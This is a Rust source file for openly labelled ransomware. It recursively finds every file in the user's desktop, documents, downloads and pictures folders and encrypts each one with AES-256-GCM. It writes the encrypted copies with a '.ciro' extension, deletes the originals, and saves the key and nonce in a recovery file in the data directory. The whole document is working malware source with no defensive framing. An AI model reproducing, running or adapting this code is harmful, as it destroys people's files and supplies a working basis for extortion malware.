// Necessary imports
use aes_gcm::{
    aead::{rand_core::OsError, Aead},
    AeadCore, Aes256Gcm, KeyInit,
};
use dirs2::{data_dir, desktop_dir, document_dir, download_dir, picture_dir};
use rayon::prelude::*;
use std::{
    fs::{read, read_dir, remove_file, File},
    io::{Error, Write},
    path::PathBuf,
};

// Main function of the program
fn main() -> Result<(), OsError> {
    // Get all the directories where the ransomware is going to run
    let desktop_dir = desktop_dir();
    let document_dir = document_dir();
    let download_dir = download_dir();
    let picture_dir = picture_dir();
    let mut dirs: Vec<PathBuf> = vec![];

    // Check if they exist
    if desktop_dir.is_some() {
        dirs.push(desktop_dir.unwrap());
    }
    if document_dir.is_some() {
        dirs.push(document_dir.unwrap());
    }
    if download_dir.is_some() {
        dirs.push(download_dir.unwrap());
    }
    if picture_dir.is_some() {
        dirs.push(picture_dir.unwrap());
    }

    // Generate a cipher to encrypt files with aes2356 algorithm
    let key = Aes256Gcm::generate_key()?;
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce()?;

    // Create a recovery file inside data dir with the cipher key and nonce
    let mut data_dir = data_dir().expect("Missing dara dir");
    data_dir.push("recovery_file");
    data_dir.set_extension("txt");
    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");

    let content = format!("key: {:?}\n nonce: {:?}", &key, &nonce);
    recovery_file
        .write_all(content.as_bytes())
        .expect("recovery file written");

    // All the directories are encrypted in parallel using rayon multithreading
    dirs.par_iter().for_each(|dir| {
        // Listing all files recursively
        let files = list_files(dir.to_owned()).expect("Couldn't list files inside the directory");
        // Encryption
        for file in files.iter() {
            let content: Vec<u8> = read(&file).expect("read");
            let ciphertext: Vec<u8> = cipher
                .encrypt(&nonce, content.as_ref())
                .expect("encrypt text");

            // A new file with the encrypted content is created and the old one deleted
            let mut new_path = file.clone();
            new_path.set_extension("ciro");
            let mut new_file = File::create(new_path).expect("file created");
            new_file.write_all(&ciphertext).expect("text written");
            let _ = remove_file(&file);
        }
    });

    Ok(())
}

// List files function simply finds all files recursively inside a directory
fn list_files(dir: PathBuf) -> Result<Vec<PathBuf>, Error> {
    let mut files: Vec<PathBuf> = vec![];
    if dir.is_dir() {
        for entry in read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                files.extend(list_files(path)?);
            } else {
                files.push(path);
            }
        }
    }
    Ok(files)
}
